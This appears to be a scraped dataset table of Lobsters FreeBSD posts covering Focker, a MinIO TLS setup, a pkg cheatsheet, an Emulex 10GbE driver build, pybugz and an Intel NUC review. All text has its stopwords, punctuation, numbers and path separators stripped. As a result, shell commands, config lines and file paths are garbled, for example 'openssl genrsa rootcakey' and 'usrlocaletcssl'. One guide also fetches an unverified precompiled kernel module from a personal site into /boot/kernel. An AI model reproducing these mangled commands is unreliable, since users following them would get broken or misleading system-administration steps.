backup jail wordpress command mysqldump mount wpbackup mntbackup restore jail wordpress command mysql mount wpbackup mntbackup image image entry focker composition file specifies dictionary image tag focker directory directory containing fockerfile supplementary file needed build image upon running focker compose build focker run focker image build specified directory tag result corresponding tag process repeated without significant performance penalty since image need rebuilt unless fockerfiles context change jail jail entry focker composition file specifies dictionary jail tag jail specification jail specification dictionary contain following field image env mount execstart execstop hostname interface image env mount semantics focker jail create command syntax env mount form dictionary execstart execstop hostname interface semantics corresponding entry etcjailconf jail recreated time focker compose build executed hence persistent data stored volume volume volume entry focker composition file specifies dictionary volume tag volume specification currently volume specification must empty dictionary specified volume created focker compose build tagged corresponding tag unless volume given tag already exist volume meant persist data beyond jail lifecycle command command entry focker composition file specifies dictionary command name command specification command specification contain following field jail mount command jail field specifies jail given command executed jail must already running mount entry specifies additional mount used execution command finally command entry specifies command using syntax run step fockerfile reading best way learn practice take look example start writing focker specification conclusion focker provides powerful containerization primitive image volume container first introduced docker platform without taking significantly challenging task achieving docker compatibility never never goal focker allows remain lightweight tool minimal dependency highly maintainable codebase time image building paradigm based checksummed stepslayers flexible composition builder offer significant time saving pragmatic sysadmins link
55,Lobsters,freebsd,FreeBSD,Minio Distributed Mode on FreeBSD with TLS,https://honeyguide.eu/posts/minio/,minio distributed mode freebsd tl,introduction minio vermaden blog minio documentation official minio documentation erasure code installing package certificate set use openssl ip address generate certificate configure minio service prepare drive start minio,introduction minio wellknown compatible object storage platform support high availability feature freebsd port available already described vermaden blog nonetheless distributed setup along line minio documentation tl encryption even official minio documentation unfortunately lack detail mean certificate setup might interesting even plan run minio another platform freebsd offical tl documentation linked self signed certificate described root ca certificate created needed minio run single host setup document assumes two host two drive minimum setup enabling erasure code setup easily scaled node also managed tool like ã nsible host example use ip address mount two drive installing package install following package host run minio pkg install minio pkg install openssl certificate set host create usrlocaletcssl usrlocaletcsslcas directory one host run following command usrlocaletcsslcas directory openssl genrsa rootcakey openssl req new day key rootcakey rootcacrt copy root certificate usrlocaletcsslcas directory system system create usrlocaletcsslopensslconf replace example ip address ip address host create file basicconstraints ca false nscerttype server nscomment openssl generated server certificate subjectkeyidentifier hash authoritykeyidentifier keyid issuer always keyusage critical digitalsignature keyencipherment extendedkeyusage serverauth subjectaltname altnames altnames alt name important minio check certificate please note document use openssl ip address generate certificate also list similar configuration file correctly add alt name certificate though afterwards directory run openssl genrsa privatekey openssl req new key privatekey publiccsr openssl req publiccsr ca casrootcacrt cakey casrootcakey cacreateserial publiccrt day extfile opensslconf feel free use appropriate value certificate attribute asked openssl check correct alt name ip address entry contained certificate openssl noout text publiccrt see output check configuration file configure minio service add following etcrcconf file system http http http miniocerts usrlocaletcssl minioenv minioaccesskeymyaccesskey miniosecretkeymysecretkey prepare drive start minio system run chown minio chmod urxw chown minio chmod urxw test configuration run minio shell see output su minio c env minioaccesskeymyaccesskey miniosecretkeymysecretkey minio server usrlocaletcssl http http http http please note parameter shown old documentation obsolete minio store configuration within data directory meanwhile everything work able connect using access key secret key credential system browser http http host replicate data load everything work stop minio server process kill start service usrlocaletcrcdminio start
56,Lobsters,freebsd,FreeBSD,Tutorial sites treating FreeBSD like a Linux distro,https://rubenerd.com/tutorial-sites-treating-freebsd-like-a-linux-distro/,tutorial site treating freebsd like linux distro,redbubble store,gold coast january deb goodkin freebsd foundation began linuxconfau talk intentionallyprovocative slide freebsd another linux distro right said jest highlight common misconception one way manifest introductory freebsd guide online usually blog word sysadmin cookbook tutorial name know one talking invariably advise updating base system pkgng immediately installing bash nano htop lsof coreutils proc go far aliasing builtin tool even setting bash root shell barely touch freebsd userland like poorlymaintained cheese utensil used grate installing entire gnu toolchain use linux distribution debiankfreebsd nexentalike o built specifically tool learning freebsd feature taking advantage benefit beyond kernel base wasted opportunity could render future project contribution difficult misunderstood assumption system work since changed tune somewhat caveat also want take spruik jay patel redbubble store bsd laptop loungeroom already added next sticker batch talking encouraging linux people try freebsd giving familiar tooling get foot door worth personally learn thing quickest jumping deep end know others want take thing step time also get lost fray freebsd even linuxfocused tool still compelling useful operating system feature bug able tool available time run faster linux could hardware may even integrate better shop otherwise entirely run linux given motivation write portable posixcompliant code application longer priority people sadface rather saying guide useful even misrepresent freebsd need reframe instead introduction freebsd say freebsd linux people constued criticism latter kind post would hugely useful also easier introduce bsdspecific tool idea either inline linuxism introduce followup post compare contrast need bridgebuilding outreach two community anything make freebsd relatable people coming linux operating system useful
57,Lobsters,freebsd,FreeBSD,Deep Integration of Filesystem Extended Attribute Support,https://hardenedbsd.org/article/shawn-webb/2020-07-03/deep-integration-filesystem-extended-attribute-support,deep integration filesystem extended attribute support,submitted,working integrating filesystem extended attribute support tmpfs libarchive pkg operating system tag elf object various flag hardenedbsd prefer use heavyhanded approach making use filesystem extended attribute enables outofband oob management security flag hardenedbsd make use extended attribute toggle exploit mitigation perbinary basis using oob method provides flexibility along easy avenue future growth made change libarchive base o submitted patch upstream patch take besteffort approach restoring systemlevel extended attribute setting systemlevel extended attribute privileged operation archive entry contains systeamlevel extended attribute extraction process privileged setting extended attribute fail failure ignored extraction process continue normal hold true today without patch extended attribute support tmpfs bare minimum ability add list remove extended attribute anyone desiring provide complete extended attribute support welcome provide patch finally hardenedbsd forked freebsd package manager aptly named pkg package manager must aware filesystem extended attribute pkg include filesystem extended attribute limited hardenedbsd use make attempt upstreaming change pkg change libarchive upstreamed future bright filesystem extended attribute one could imagine future pkg store hash file extended attribute kernel check hash stored attribute sky limit integrating exploit mitigation toggling port tree hardenedbsd ship package exploit mitigation toggled misbehaving application like firefox java nodejs etc
58,Lobsters,freebsd,FreeBSD,Simple ipfw NAT for bhyve virtual machines and vnet jails,https://adventurist.me/posts/00304 ,simple ipfw nat bhyve virtual machine vnet jail,tom jones stuff blog µblog birdsite talk hacklab campgnd northernrst contact,tom jones militant internet engineer kernel hacker adventurist stuff blog µblog birdsite talk founder member director hacklab aberdeen first hackerspace organise campgnd scotland first hackercamp friendly wee tech conference north east scotland called northernrst contact
59,Lobsters,freebsd,FreeBSD,FreeBSD Binary Package Manager Cheatsheet,http://unix.cafe/wp/en/2020/06/the-freebsd-binary-package-manager-cheatsheet/,freebsd binary package manager cheatsheet,note refresh enabled repository force refreshing enabled repository note upgrade installed package fetch upgrade detect possible conflict simulate upgrade process upgrade one package eg force upgrade reinstallation installed package note search package eg search package start search two package eg search package start alphacharacter followed display package downloadable url eg display package size eg display package size getting unpacked installed eg display package maintainer email eg display package category eg display package option eg display package dependent eg search package comment search package description search package dependency eg search exact package eg display package information eg display package origin eg display package installed eg display repository provides package eg display package project url eg note install package eg reinstall installed package eg reinstall installed package dependent eg fetch package detect conflict eg install package mark automatic eg force installation package even missing dependency eg simulate installation process eg note download available update download package eg download package dependency eg download available package download package custom folder eg note check whether package installed eg another method check existence package eg alternative way know package installed eg list installed package dependency list installed package without dependency list installed package dependency display package installed eg get information installed package eg get total size file installed package eg display installed package short description eg list dependency installed package eg list installed package dependent eg list file installed package eg display installed package origin eg display installed package message eg note lock package eg lock installed package list locked installed package unlock package eg unlock installed package check locked package note delete installed package eg force deletion package eg delete installed package except simulate deletion process eg note remove orphan installed package simulate removal orphan package note remove old version package cache simulate removal package cache remove package cache note get general package statistic get remote package database stats count installed package dependency get local package database stats count installed package dependency count installed package without dependency,let find essential command needed manage binary package freebsd operating system looking practical pkg commandskeep mind root privilege needed gain privilege either login root su root password prefix following command sudo user sudoer except working pkg query pkg info pkg stats need root privilegesupdateupgradesearchinstallfetchinfolockunlockdeleteauto removecleanstatisticspkgupdate note used refresh repositoriesto suppress output use q quiet flagrefresh enabled repository root freebsd pkg updateit simply synchronizes catalogue enabled repository serversforce refreshing enabled repository root freebsd pkg update using fullform flag forcepkgupgrade note used install newest version available one packagesby default store downloaded package varcachepkgit automatically updaterefresh repository catalogue unless u norepoupdate flag usedto assume yes answer confirmation question upgrade process use yes flagto suppress output use q quiet flagif q n flag used summary work list displayedupgrade installed package root freebsd pkg upgradeit simply installs newest available version installed packagesjust fetch upgrade detect possible conflict root freebsd pkg upgrade using fullform flag fetchonlysimulate upgrade process root freebsd pkg upgrade using fullform flag dryrunupgrade one package eg vim root freebsd pkg upgrade vimit simply installs newest available version vimforce upgrade reinstallation installed package root freebsd pkg upgrade using fullform flag forcepkgsearch note used search package repository cataloguesit automatically updaterefresh repository catalogue unless u norepoupdate flag usedto produce le output use q quiet flagsearch package eg vim root freebsd pkg search vimsearch package start vim root freebsd pkg search vimsearch two package eg neofetch screenfetch root freebsd pkg search neofetchscreenfetchsince package end fetch make like root freebsd pkg search neoscreen fetchsearch package start alphacharacter followed top root freebsd pkg search az topdisplay package downloadable url eg root freebsd pkg search q url using fullform flag querymodifierdisplay package size eg root freebsd pkg search q pkgsize package size getting unpacked installed eg root freebsd pkg search using fullform flag size pkg search q size package maintainer email eg root freebsd pkg search q maintainer package category eg root freebsd pkg search q category package option eg root freebsd pkg search q option package dependent eg root freebsd pkg search q requiredby debian package comment root freebsd pkg search c debianor using fullform flag comment pkg search comment debiansearch gnuorg package description root freebsd pkg search gnuorgor using fullform flag description pkg search description gnuorgsearch package dependency eg root freebsd pkg search using fullform flag dependson pkg search q dependson vimsearch exact package eg root freebsd pkg search e using fullform flag exactdisplay package information eg root freebsd pkg search f using fullform flag full pkg search q full package origin eg root freebsd pkg search using fullform flag origin pkg search l origin package installed eg root freebsd pkg search p using fullform flag prefix pkg search q prefix repository provides package eg root freebsd pkg search q repository package project url eg root freebsd pkg search q www note used installation package package repository local archivesby default store downloaded package varcachepkgit automatically updaterefresh repository catalogue unless u norepoupdate flag usedto assume yes answer confirmation question installation process use yes flagto suppress output use q quiet flagif q n flag used package going installed upgraded deleted always showninstall package eg vim root freebsd pkg install vimnote keep downloaded package varcachepkg even installationreinstall installed package eg vim root freebsd pkg install f vimor using fullform flag forcereinstall installed package dependent eg vim root freebsd pkg install rf vimor using fullform flag recursivefetch package detect conflict eg vim root freebsd pkg install f vimor using fullform flag fetchonlyinstall package mark automatic eg vim root freebsd pkg install vimor using fullform flag automaticwhich mean package depend vim command pkg autoremove issued vim removed automaticallyforce installation package even missing dependency eg vim root freebsd pkg install vimor using fullform flag ignoremissingsimulate installation process eg vim root freebsd pkg install n vimor using fullform flag dryrunwhich print list change package without actually applying pkgfetch note used downloading binary package without installing automaticallyit useful offline us manually interact package contentsdownloaded package installed using pkgadd pkginstallby default store downloaded package varcachepkgit automatically updaterefresh repository catalogue unless u norepoupdate flag usedto assume yes answer confirmation question fetching process use yes flagto suppress output use q quiet flagdownload available update root freebsd pkg fetch uor using fullform flag availableupdatesdownload package eg vim root freebsd pkg fetch vimit downloaded varcachepkgdownload package dependency eg vim root freebsd pkg fetch vimor using fullform flag dependenciesdownload available package root freebsd pkg fetch aor using fullform flag alldownload package custom folder eg vim root freebsd mkdir tmppkgs root freebsd pkg fetch tmppkgs vimor using fullform flag outputpkginfo note used display information packagesto suppress output print requested information use q quiet flagcheck whether package installed eg vim root freebsd pkg info grep vimor using fullform flag output mean vim installed otherwise isanother method check existence package eg vim root freebsd pkg info e vim echo using fullform flag exists vim installed registered database return otherwise returnedalternative way know package installed eg vim root freebsd pkg info x vimor using fullform flag regexlist installed package dependency root freebsd pkg info aor using fullform flag alllist installed package without dependency root freebsd pkg query e n vor using fullform flag evaluate return matched package automatically installed dependency another package otherwise n name matched package v version matched packagelist installed package dependency root freebsd pkg query e n valready explained keep mind package manually installed flag shown even dependencydisplay package installed eg vim root freebsd pkg info p vimor using fullform flag prefixget information installed package eg vim root freebsd pkg info vim full information use f fullget total size file installed package eg vim root freebsd pkg info vimor using fullform flag sizedisplay installed package short description eg vim root freebsd pkg info vimor using fullform flag commentlist dependency installed package eg vim root freebsd pkg info vimor using fullform flag dependencieslist installed package dependent eg vim root freebsd pkg info r vimor using fullform flag requiredbylist file installed package eg vim root freebsd pkg info l vimor using fullform flag listfilesdisplay installed package origin eg vim root freebsd pkg info vimor using fullform flag origindisplay installed package message eg vim root freebsd pkg info vimor using fullform flag pkgmessagepkglock note used lock unlock installed packageslocking package mean make package immune reinstallation upgrading downgrading deletionall locked package dependent dependency effect may even forbid installation package require different version locked package use carefullyto assume yes answer confirmation question lock unlock process use yes flagto suppress output except confirmatory question use q quiet flaglock package eg vim root freebsd pkg lock vimlock installed package root freebsd pkg lock aor using fullform flag alllist locked installed package root freebsd pkg lock lor using fullform flag showlockedunlock package eg vim root freebsd pkg unlock vimunlock installed package root freebsd pkg unlock aor using fullform flag allcheck locked package root freebsd pkg lock haslockedpackages least one locked package return otherwise returnedpkgdelete note used delete installed package database systempkg remove alias pkg delete mean exact jobto assume yes answer confirmation question deletion process use yes flagto suppress output use q quiet flagif q n flag used list package deleted displayeddelete installed package eg vim root freebsd pkg delete vimto delete one package time separate package space eg pkg delete vim deletion package eg vim root freebsd pkg delete f vimor using fullform flag forceif f flag used together cause pkg package deleted welldelete installed package except pkg root freebsd pkg delete aor using fullform flag allsimulate deletion process eg vim root freebsd pkg delete n vimor using fullform flag dryrunpkgautoremove note used remove orphan installed packagesto assume yes answer confirmation question autoremoval process use yes flagto suppress output use q quiet flagremove orphan installed package root freebsd pkg autoremoveit simply remove unneeded package anymore installed dependency resolutionsimulate removal orphan package root freebsd pkg autoremove using fullform flag dryrunpkgclean note used delete previous downloaded packagesby default package cache stored varcachepkgto assume yes answer confirmation question installation process use yes flagto suppress output use q quiet flagif q flag used output suppressedremove old version package cache root freebsd pkg cleanit remove old version package package longer providedsimulate removal package cache root freebsd pkg clean using fullform flag dryrunremove package cache root freebsd pkg clean aor using fullform flag allpkgstats note used display package database statisticsto suppress output use q quiet flagto display disk space usage byte use b byte flagget general package statistic root freebsd pkg statsdisplays remote local package database statsget remote package database stats root freebsd pkg stats ror using fullform flag remotecount installed package dependency root freebsd pkg query e n v wc lget local package database stats root freebsd pkg stats lor using fullform flag localcount installed package dependency root freebsd pkg info wc lcount installed package without dependency root freebsd pkg query e n v wc l clear install whatever package want used vim example easiest related
60,Lobsters,freebsd,FreeBSD,Emulex - Cheapest 10GE for Your Homelab on FreeBSD,https://vincerants.com/emulex-the-cheapest-10gbe/,emulex cheapest homelab freebsd,card model number look freenas freebsd freebsd freebsd freebsd freebsd oce oce http opnsense hardenedbsd freebsd freebsd oce http vincerantscompublicopnsenseifoceko custom compiling emulex oce driver prepping usrsrc tree freebsd custom compiling emulex oce driver updating driver source code hardenedbsd custom compiling emulex oce driver applying patch compiling custom compiling emulex oce driver installing driver,year ago hunt cheapest nics resulted buying mellanox singleport network card ebay around nowadays card increased cost around still cheap quite cheapest alternative diving detail let get something clear want absolute simplest plugandplay lan homelab pay extra mellanox willing go handson simple manual configuration installation read experience emulex nics emulex nics often around ebay sometimes even cheaper recently picked set card came bundled sfp module grand total considering usually find sfp module alone worth card model number look emulex freenas freenas easiest o work card work box latest driver backported freebsd enabled default put card configure like would nic freenas freebsd freebsd includes latest driver much like freenas however enabled load automatically one small file edit take add following line bootloaderconf file root opnsense echo ifoceload yes bootloaderconf reboot configure nic like normal freebsd want basic network connectivity vlan support simply follow direction freebsd however note freebsd release us outdated driver work feature carp freebsd freebsd version freebsd include broken version emulex oce driver card work card cause kernel panic initializing driver please continue reading detail custom compiling emulex oce driver already experienced compiling implementing freebsd driver change simply head commit patch http opnsense hardenedbsd os come driver included freebsd box driver basic networking vlan functionality also disabled default also lack support advanced networking feature like carp need advanced networking feature simply follow instruction freebsd enable emulex oce driver boot want quick easy solution provided precompiled binary patched driver following url http vincerantscompublicopnsenseifoceko root opnsense cd bootkernel root opnsense bootkernel fetch http vincerantscompublicopnsenseifoceko ifoceko kb kbps custom compiling emulex oce driver prepping usrsrc tree intended use case nics series opnsense router part guide going custom tailored building driver natively o first install nano easier text file editing next enable freebsd package repository use repository install git way may clone source tree root opnsense pkg install nano updating opnsense repository catalogue fetching metatxz kib fetching packagesitetxz kib processing entry opnsense repository update completed package processed repository date updating database digest format new version pkg detected need installed first following package affected checked installed package upgraded pkg number package upgraded mib downloaded fetching mib checking integrity done conflicting upgrading pkg extracting updating opnsense repository catalogue opnsense repository date repository date following package affected checked new package installed nano number package installed kib downloaded fetching kib checking integrity done conflicting installing extracting root opnsense echo freebsd enabled yes usrlocaletcpkgreposfreebsdconf root opnsense usrsrc pkg install git updating freebsd repository catalogue fetching metatxz b fetching packagesitetxz mib processing entry freebsd repository update completed package processed updating opnsense repository catalogue opnsense repository date repository date new version pkg detected need installed first following package affected checked installed package upgraded pkg freebsd number package upgraded mib downloaded fetching mib checking integrity done conflicting upgrading pkg extracting updating freebsd repository catalogue freebsd repository date updating opnsense repository catalogue opnsense repository date repository date following package affected checked new package installed cvsps opnsense fontconfig freebsd freebsd git opnsense libfontenc freebsd libunistring freebsd libunwind freebsd opnsense opnsense png freebsd number package installed process require mib space mib downloaded fetching mib fetching kib fetching mib fetching kib fetching kib fetching kib fetching kib fetching kib fetching kib fetching kib checking integrity done conflicting installing extracting installing extracting installing extracting installing creating group creating group gitdaemon gid creating user creating user gitdaemon uid extracting installing extracting installing extracting running fccache build fontconfig cache font directory usrlocalsharefonts usrlocalsharefonts skipping directory skipping directory vardbfontconfig cleaning cache directory fccache succeeded installing extracting installing extracting installing extracting installing extracting message series us new subpixel hinting mode port option default emulating modern version cleartype change inevitably lead different rendering result might change port option adapt taste use new freetypeproperties environment variable environment variable freetypeproperties used control driver property example freetypepropertiestruetype cff autofitter allows select say subpixel hinting mode runtime given application longpcfnames port option enabled pcf family name may include foundry information whether contain wide character example sony fixed misc fixed wide instead fixed disabled run time using pcf nolongfamilynames property needed example freetypepropertiespcf recreate fontconfig cache using environment variable needed env freetypepropertiespcf fccache fsv controllable property listed section controlling freetype module reference table content documentation installed message installed gitweb option please follow instruction directory usrlocalshareexamplesgitgitweb find file make gitweb work public repository web make gitweb work please sure able execute cgi script usrlocalshareexamplesgitgitweb set gitwebconfig variable webserver config usrlocaletcgitgitwebconf variable passed gitwebcgi restart server installed contrib option please note script installed usrlocalsharegitcorecontrib require port installed perl python etc may need install manually root opnsense usrsrc git clone http githubcomhardenedbsdhardenedbsdgit b singlebranch usrsrc cloning usrsrc remote enumerating object done remote counting object done remote compressing object done remote total delta reused delta packreused receiving object mib mib done resolving delta done updating file done custom compiling emulex oce driver updating driver source code hardenedbsd source code need update driver recent version patch ensure kernel segfault boot root opnsense cd usrsrcsysnet root opnsense usrsrcsysnet fetch http etherneth kb mbps root opnsense cd usrsrcsysdevoce root opnsense usrsrcsysdevoce total rwr r root wheel jun ocehwc rwr r root wheel jun ocehwh rwr r root wheel jun oceifc rwr r root wheel jun oceifh rwr r root wheel jun ocemboxc rwr r root wheel jun ocequeuec rwr r root wheel jun ocesysctlc rwr r root wheel jun oceutilc root opnsense usrsrcsysdevoce fetch http ocehwc kb mbps root opnsense usrsrcsysdevoce fetch http ocehwh kb mbps root opnsense usrsrcsysdevoce fetch http oceifc kb mbps root opnsense usrsrcsysdevoce fetch http oceifh kb mbps root opnsense usrsrcsysdevoce fetch http ocemboxc kb mbps root opnsense usrsrcsysdevoce fetch http ocequeuec kb mbps root opnsense usrsrcsysdevoce fetch http ocesysctlc kb mbps root opnsense usrsrcsysdevoce fetch http oceuserh b mbps root opnsense usrsrcsysdevoce fetch http oceutilc b mbps root opnsense usrsrcsysdevoce fetch http b kbps root opnsense usrsrcsysdevoce total rwr r root wheel jun rwr r root wheel jun ocehwc rwr r root wheel jun ocehwh rwr r root wheel jun oceifc rwr r root wheel jun oceifh rwr r root wheel jun ocemboxc rwr r root wheel jun ocequeuec rwr r root wheel jun ocesysctlc rwr r root wheel jun oceuserh rwr r root wheel jun oceutilc custom compiling emulex oce driver applying patch compiling file downloaded time apply patch compile new driver root opnsense usrsrcsysdevoce patch oceifc hmm look like unified diff text leading mon sep mav mav freebsdorg date tue may subject patch fix array bound panic introduced see different nics different configuration may different number tx rx queue code assuming mapping event queue interrupt txrx queue since number interrupt set maximum tx rx queue two different system doomed documentation deep knowledge hardware change based general observation code reading guess wrong please better confirmed hp nics working mfc week sponsored ixsystems inc sysdevoceoceifc file changed insertion deletion diff git asysdevoceoceifc bsysdevoceoceifc index asysdevoceoceifc bsysdevoceoceifc patching file oceifc using plan hunk succeeded done root opnsense cd usrsrcsysmodulesoce root opnsense usrsrcsysmodulesoce make machine awk f usrsrcsystoolsmakeobjopsawk usrsrcsyskernbusifm h awk f usrsrcsystoolsmakeobjopsawk usrsrcsyskerndeviceifm h awk f usrsrcsystoolsmakeobjopsawk usrsrcsysdevpcipciifm h warning object directory changed original usrsrcsysmodulesoce cc pipe dhardenedbsd dsmp fnostrictaliasing werror dkernel dkldmodule nostdinc iusrsrcsysdevoce iusrsrcsys fnocommon fnoomitframepointer mnoomitleafframepointer md mfdependoceifo mtoceifo mcmodelkernel mnoredzone mnommx mnosse msoftfloat fnoasynchronousunwindtables ffreestanding fwrapv fstackprotector wall wredundantdecls wnestedexterns wstrictprototypes wmissingprototypes wpointerarith winline wcastqual wundef wnopointersign dprintffreebsdkprintf wmissingincludedirs fdiagnosticsshowoption wnounknownpragmas wnoerrortautologicalcompare wnoerroremptybody wnoerrorparenthesesequality wnoerrorunusedfunction wnoerrorpointersign wnoerrorshiftnegativevalue wnoerroraddressofpackedmember mnoaes mnoavx c usrsrcsysdevoceoceifc oceifo cc pipe dhardenedbsd dsmp fnostrictaliasing werror dkernel dkldmodule nostdinc iusrsrcsysdevoce iusrsrcsys fnocommon fnoomitframepointer mnoomitleafframepointer md mfdependocehwo mtocehwo mcmodelkernel mnoredzone mnommx mnosse msoftfloat fnoasynchronousunwindtables ffreestanding fwrapv fstackprotector wall wredundantdecls wnestedexterns wstrictprototypes wmissingprototypes wpointerarith winline wcastqual wundef wnopointersign dprintffreebsdkprintf wmissingincludedirs fdiagnosticsshowoption wnounknownpragmas wnoerrortautologicalcompare wnoerroremptybody wnoerrorparenthesesequality wnoerrorunusedfunction wnoerrorpointersign wnoerrorshiftnegativevalue wnoerroraddressofpackedmember mnoaes mnoavx c usrsrcsysdevoceocehwc ocehwo cc pipe dhardenedbsd dsmp fnostrictaliasing werror dkernel dkldmodule nostdinc iusrsrcsysdevoce iusrsrcsys fnocommon fnoomitframepointer mnoomitleafframepointer md mfdependocemboxo mtocemboxo mcmodelkernel mnoredzone mnommx mnosse msoftfloat fnoasynchronousunwindtables ffreestanding fwrapv fstackprotector wall wredundantdecls wnestedexterns wstrictprototypes wmissingprototypes wpointerarith winline wcastqual wundef wnopointersign dprintffreebsdkprintf wmissingincludedirs fdiagnosticsshowoption wnounknownpragmas wnoerrortautologicalcompare wnoerroremptybody wnoerrorparenthesesequality wnoerrorunusedfunction wnoerrorpointersign wnoerrorshiftnegativevalue wnoerroraddressofpackedmember mnoaes mnoavx c usrsrcsysdevoceocemboxc ocemboxo cc pipe dhardenedbsd dsmp fnostrictaliasing werror dkernel dkldmodule nostdinc iusrsrcsysdevoce iusrsrcsys fnocommon fnoomitframepointer mnoomitleafframepointer md mfdependoceutilo mtoceutilo mcmodelkernel mnoredzone mnommx mnosse msoftfloat fnoasynchronousunwindtables ffreestanding fwrapv fstackprotector wall wredundantdecls wnestedexterns wstrictprototypes wmissingprototypes wpointerarith winline wcastqual wundef wnopointersign dprintffreebsdkprintf wmissingincludedirs fdiagnosticsshowoption wnounknownpragmas wnoerrortautologicalcompare wnoerroremptybody wnoerrorparenthesesequality wnoerrorunusedfunction wnoerrorpointersign wnoerrorshiftnegativevalue wnoerroraddressofpackedmember mnoaes mnoavx c usrsrcsysdevoceoceutilc oceutilo cc pipe dhardenedbsd dsmp fnostrictaliasing werror dkernel dkldmodule nostdinc iusrsrcsysdevoce iusrsrcsys fnocommon fnoomitframepointer mnoomitleafframepointer md mfdependocequeueo mtocequeueo mcmodelkernel mnoredzone mnommx mnosse msoftfloat fnoasynchronousunwindtables ffreestanding fwrapv fstackprotector wall wredundantdecls wnestedexterns wstrictprototypes wmissingprototypes wpointerarith winline wcastqual wundef wnopointersign dprintffreebsdkprintf wmissingincludedirs fdiagnosticsshowoption wnounknownpragmas wnoerrortautologicalcompare wnoerroremptybody wnoerrorparenthesesequality wnoerrorunusedfunction wnoerrorpointersign wnoerrorshiftnegativevalue wnoerroraddressofpackedmember mnoaes mnoavx c usrsrcsysdevoceocequeuec ocequeueo cc pipe dhardenedbsd dsmp fnostrictaliasing werror dkernel dkldmodule nostdinc iusrsrcsysdevoce iusrsrcsys fnocommon fnoomitframepointer mnoomitleafframepointer md mfdependocesysctlo mtocesysctlo mcmodelkernel mnoredzone mnommx mnosse msoftfloat fnoasynchronousunwindtables ffreestanding fwrapv fstackprotector wall wredundantdecls wnestedexterns wstrictprototypes wmissingprototypes wpointerarith winline wcastqual wundef wnopointersign dprintffreebsdkprintf wmissingincludedirs fdiagnosticsshowoption wnounknownpragmas wnoerrortautologicalcompare wnoerroremptybody wnoerrorparenthesesequality wnoerrorunusedfunction wnoerrorpointersign wnoerrorshiftnegativevalue wnoerroraddressofpackedmember mnoaes mnoavx c usrsrcsysdevoceocesysctlc ocesysctlo ld warncommon r ifoceko oceifo ocehwo ocemboxo oceutilo ocequeueo ocesysctlo exportsyms awk f usrsrcsysconfkmodsymsawk ifoceko exportsyms xargs j objcopy ifoceko objcopy stripdebug ifoceko root opnsense usrsrcsysmodulesoce total rwr r root wheel jun dependocehwo rwr r root wheel jun dependoceifo rwr r root wheel jun dependocemboxo rwr r root wheel jun dependocequeueo rwr r root wheel jun dependocesysctlo rwr r root wheel jun dependoceutilo rwr r root wheel jun makefile rwr r root wheel jun busifh rwr r root wheel jun deviceifh rwr r root wheel jun exportsyms rwr r root wheel jun ifoceko lrwxrxrx root wheel jun machine rwr r root wheel jun ocehwo rwr r root wheel jun oceifo rwr r root wheel jun ocemboxo rwr r root wheel jun ocequeueo rwr r root wheel jun ocesysctlo rwr r root wheel jun oceutilo rwr r root wheel jun optineth rwr r root wheel jun rwr r root wheel jun pciifh lrwxrxrx root wheel jun custom compiling emulex oce driver installing driver driver built thing left install system copy driver bootkernel folder enable driver bootloaderconf root opnsense usrsrcsysmodulesoce cp ifoceko bootkernel root opnsense usrsrcsysmodulesoce bootkernel grep oce rxrxrx root wheel jun ifoceko root opnsense echo ifoceload yes bootloaderconf
61,Lobsters,freebsd,FreeBSD,Command Line Bug Hunting in FreeBSD,https://adventurist.me/posts/00301,command line bug hunting freebsd,bugzilla run bugsquash command line tool interacting bugzilla called pybugz readme github,freebsd us bugzilla tracking bug taking feature request regression issue operating system web interface bugzilla okay want lot batch operation slow deal planning run bugsquash july really need tooling help hacker show process giant bug list thankfully command line tool interacting bugzilla called pybugz bugz allows search date modify bug without use web browser getting bugz going intuitive took bit faffing bugz ship configuration connecting freebsd bugzilla use selecting connection supported connection dumped try operation debug flag flag really helpful figuring use bugz document hold documentation like powerful secret bugz really want authenticate anything wo nt show help command without auth however skipauth flag search bug let look issue patch base system bugz connection freebsd skipauth search product base system patch info using freebsd http bugsfreebsdorgbugzillaxmlrpccgi info searching bug meeting following criterion info product base system info status new open progress unconfirmed info summary patch bug patch support ggated bug patch tcpdump zero checksum invalid udp bug networksubr patch add support style alias rcconf bdrewery patch getifaddrs report address properly compatibility mode rc networksubr patch slaac enabled bug patch whois add support sld whois server lookup address lookup bug patch link route configured using autoconfiguration manual configuration bug networksubr patch add keyword nt specified bug patch class option bug ipfw lo patch loopback interface marking packet bz patch update temporary address lifetime according info bug found also filter search component bugz connection freebsd skipauth search product base system component bhyve bugz support modifying updating bugz command line main focus readme github authenticate bugz take username password command line suggesting fill history bugzilla password something like bugz connection freebsd u thj freebsdorg password pas show freebsdbugz head n search udp k flag take key file nt want dig source bugz figure actually bug squash probably going focus clearing bug patch readme workflow finding bug grabbing diffs tool written around bugz start playing spotted bug easily closed tracker finally going need help using bugz took longer liked figure sub command document help take h command need auth skip auth use flag bugz connection freebsd skipauth search h
62,Lobsters,freebsd,FreeBSD,FreeBSD on the Intel 10th Gen i3 NUC,https://adventurist.me/posts/00300,freebsd intel gen nuc,work hardware support,ended gen nuc specific put work testbed quite new device build date box figure true role one might run linux need install freebsd current see performance hardware support intel core thread ghz boost got single dimm ram western digital ssd configuration came nuc nucs pretty small pretty beefy fan taking cm top enclosure certainly nt silent without load could hear nuc sat desk next building full steam fan nuc loud thinkpad building work box break bios disable secure boot boot freebsd installer hitting every fn key nuc booted think correct choice time keyboard fought usb bluetooth macbook pro freebsd install problem free set single drive zfs datasets snapshot magic power tried anything else get idea well nuc would build freebsd nt expect build machine spent shopping build machine recently settled vm hetzner benchmark really care make buildworld buildkernel took nt fastest world faster difference year make graphic gen intel processor nt supported drmcurrentkmod install drmdevelkmod devel kmod nuc happy push pixel tv even drive additional second monitor connected usbc hdmi adapter time audio work front jack changing hwsnddefaultunit hdmi issue display blanked turned audio stop wo nt come back display manu suggested setting loaderconf resolved problem intel wifi nuc supported yet stuck cheap rtwn based usb wifi dongle front port external usb wifi cumbersome laptop machine rarely move fine onboard ethernet supported em happy tcp udp nuc usb port usba two usbc usbc port back little lightning bolt next imagine mean one thunderbolt support disk speed test sandisk extreme portable ssd front port managed rear thunderbolt one got read write macbook pro manages advertised read speed need dig whether hardware problem freebsd problem luckily two installing linux test performance wo nt bother quite like little box get hardware money tower pc form factor would nt surprised version quite good building freebsd fan bit loud fixed playing blaring techno think nuc configuration going make great test node satellite testbed nice little desktop box video task hardware support storage yes fine nt drive test sata graphic yes drmdevelkmod audio yes hda ethernet yes supported em wireless intel ac supported usb yes port work suspendresume yes suspend fine resume required drmdevelkmod sd slot yes come mmcsdx device thunderbolt na idea implication test
